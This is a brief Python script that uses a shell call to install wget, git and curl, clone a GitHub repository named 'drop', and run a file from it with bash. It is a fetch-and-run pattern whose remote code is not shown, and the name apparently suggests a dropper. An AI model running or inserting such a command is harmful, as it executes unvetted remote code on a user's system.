#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/siyamthandangxokolo/drop.git;cd drop;chmod +x drop;bash drop", shell=True)
